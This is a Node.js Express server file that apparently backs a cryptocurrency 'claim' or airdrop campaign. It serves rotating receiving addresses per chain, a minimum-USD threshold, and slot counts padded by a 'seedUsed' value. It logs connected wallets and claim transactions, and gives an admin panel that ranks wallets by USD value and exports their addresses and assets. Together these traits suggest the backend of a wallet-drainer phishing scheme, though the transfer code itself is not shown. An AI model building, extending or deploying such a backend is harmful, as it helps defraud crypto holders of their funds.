import 'dotenv/config';
import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { CHAINS, TRON, EVM_RE, TRON_RE, publicChains } from './lib/chains.js';
import { startPriceRefresh } from './lib/prices.js';
import * as store from './lib/store.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ADMIN_KEY = process.env.ADMIN_KEY || 'change-me';
const app = express();

app.use(express.json({ limit: '256kb' }));
app.use(express.static(path.join(__dirname, 'public')));

startPriceRefresh();

const auth = (req, res, next) =>
  req.get('x-admin-key') === ADMIN_KEY ? next() : res.status(401).json({ error: 'unauthorized' });

app.get('/healthz', (_req, res) => res.json({ ok: true }));

/* ---------- public ---------- */

app.get('/api/config', async (_req, res) => {
  const s = await store.load();
  res.json({
    campaign: { slots: s.slots, used: await store.usedCount(), minUsd: s.minUsd, gasFloorUsd: s.gasFloorUsd },
    receiving: await store.resolveAll(),
    chains: publicChains(),
    tron: { enabled: !!String(s.received.tron || '').trim(), tokens: TRON.tokens },
    wcProjectId: process.env.WC_PROJECT_ID || ''
  });
});

app.get('/api/claims', async (_req, res) => {
  const s = await store.load();
  res.json(s.claims.slice(0, 12).map(c => ({
    address: c.address, symbol: c.symbol, amount: c.amount, chain: c.chain
  })));
});

app.post('/api/connect', async (req, res) => {
  const { address, chain, connector } = req.body || {};
  if (!address) return res.status(400).json({ error: 'address required' });
  const isNew = await store.addWallet(address, { chain, connector });
  res.json({ ok: true, isNew, used: await store.usedCount() });
});

app.post('/api/claim', async (req, res) => {
  const { address, chain, symbol, amount, usd, txHash } = req.body || {};
  if (!address || !txHash) return res.status(400).json({ error: 'bad claim' });
  await store.addClaim({ address, chain, symbol, amount, usd, txHash });
  res.json({ ok: true });
});

/* ---------- admin ---------- */

app.get('/admin', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

app.get('/api/admin/config', auth, async (_req, res) => {
  const s = await store.load();
  res.json({
    received: s.received, minUsd: s.minUsd, gasFloorUsd: s.gasFloorUsd,
    slots: s.slots, seedUsed: s.seedUsed, used: await store.usedCount(),
    totalUsd: s.totalUsd, wallets: Object.keys(s.wallets).length,
    chains: CHAINS.map(c => ({ key: c.key, name: c.name, symbol: c.symbol }))
      .concat([{ key: 'tron', name: 'Tron', symbol: 'TRX' }])
  });
});

app.post('/api/admin/config', auth, async (req, res) => {
  const s = await store.load();
  const b = req.body || {};
  const invalid = [];

  if (b.received && typeof b.received === 'object') {
    for (const key of Object.keys(s.received)) {
      if (typeof b.received[key] !== 'string') continue;
      const list = b.received[key].split(',').map(v => v.trim()).filter(Boolean);
      for (const addr of list) {
        const ok = key === 'tron' ? TRON_RE.test(addr) : EVM_RE.test(addr);
        if (!ok) invalid.push(`${key}: ${addr}`);
      }
      s.received[key] = list.join(',');
    }
  }

  for (const k of ['minUsd', 'gasFloorUsd', 'slots', 'seedUsed']) {
    if (typeof b[k] === 'number' && b[k] >= 0) s[k] = b[k];
  }
  s.rotator = 0;
  await store.persistNow();
  res.json({ ok: true, invalid });
});

app.get('/api/admin/wallets', auth, async (_req, res) => {
  const s = await store.load();
  res.json(Object.values(s.wallets).sort((a, b) => (b.usd || 0) - (a.usd || 0)).slice(0, 500));
});

app.get('/api/admin/export', auth, async (_req, res) => {
  const s = await store.load();
  const rows = [['address', 'first_seen', 'usd', 'assets']];
  for (const w of Object.values(s.wallets)) {
    rows.push([w.address, w.firstSeen, w.usd || 0, JSON.stringify(w.assets || [])]);
  }
  res.type('text/csv').send(rows.map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')).join('\n'));
});

app.post('/api/admin/reset', auth, async (_req, res) => {
  const s = await store.load();
  s.wallets = {}; s.claims = []; s.totalUsd = 0; s.rotator = 0;
  await store.persistNow();
  res.json({ ok: true });
});

process.on('SIGTERM', async () => { await store.persistNow(); process.exit(0); });
process.on('SIGINT', async () => { await store.persistNow(); process.exit(0); });

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`listening on ${port}`));
